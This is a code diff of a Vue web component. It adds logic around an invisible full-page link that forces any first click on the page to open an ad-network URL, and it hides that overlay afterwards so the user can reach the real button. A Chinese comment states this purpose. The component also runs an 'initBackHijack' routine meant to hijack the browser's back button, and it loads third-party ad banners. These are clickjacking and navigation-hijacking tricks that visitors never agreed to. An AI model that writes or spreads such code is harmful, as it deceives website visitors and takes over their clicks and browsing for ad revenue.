@@ -4,7 +4,10 @@
 
     <a href="https://www.profitablecpmratenetwork.com/eet0d835?key=edd631eedc507862650ff626c430b6da"
        target="_blank"
-       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;">
+       ref="stealthNet"
+       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;"
+       @click="hideStealthNet"
+    >
     </a>
 
     <!-- 通知权限弹窗 -->
@@ -14,16 +17,23 @@
 
 <script setup>
 import {AdsterraAd} from "../utils/adSdk";
-import {onMounted} from "vue";
+import {onMounted, ref} from "vue";
 import NotificationDialog from "@/components/NotificationDialog.vue";
 
 AdsterraAd.showNativeBanner("ad.ttgame");
+
+const stealthNet = ref(null);
 
 onMounted(() => {
   setTimeout(() => {
     initBackHijack();
   }, 500)
 })
+
+// 点击全屏网后，将其隐藏，让老哥退回来时能点到真按钮
+const hideStealthNet = () => {
+  stealthNet.value.style.display = 'none';
+}
 
 const initBackHijack = (showPopupCallback) => {
   let baseUrl = location.href.split('?')[0]; // 获取干净的当前URL
